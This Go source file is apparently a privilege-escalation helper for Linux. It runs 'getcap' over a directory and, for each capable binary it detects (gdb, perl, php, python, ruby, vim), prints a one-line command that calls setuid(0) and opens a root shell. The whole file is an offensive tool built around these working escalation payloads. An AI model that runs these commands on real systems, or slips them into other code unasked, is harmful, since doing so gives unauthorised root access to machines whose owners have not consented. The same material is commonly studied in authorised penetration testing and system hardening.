package privilege_check

import (
	"fmt"
	"os/exec"
	"strings"
)

func Capabilities_Check(dir string) {
	fmt.Println("Capabilities privilege checking...")
	if dir == "" {
		dir = "/usr/bin"
	}
	cmd := exec.Command("getcap", "-r", fmt.Sprintf(dir))
	result, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("it may not have capabilities privilege can be used")
		return
	}
	fmt.Println("capabilities privilege checking result:")
	cap_check(string(result))
}

func cap_check(result string) {
	if strings.Contains(result, "gdb") {
		fmt.Println("gdb cap_use:gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit")
	}
	if strings.Contains(result, "perl") {
		fmt.Println("perl cap_use:perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'")
	}
	if strings.Contains(result, "php") {
		fmt.Println("php cap_use:php -r \"posix_setuid(0); system('/bin/sh');\"")
	}
	if strings.Contains(result, "python") {
		fmt.Println("python cap_use:python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'")
	}
	if strings.Contains(result, "ruby") {
		fmt.Println("ruby cap_use:ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"' ")
	}
	if strings.Contains(result, "vim") {
		fmt.Println("vim cap_use:vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'")
	}
}
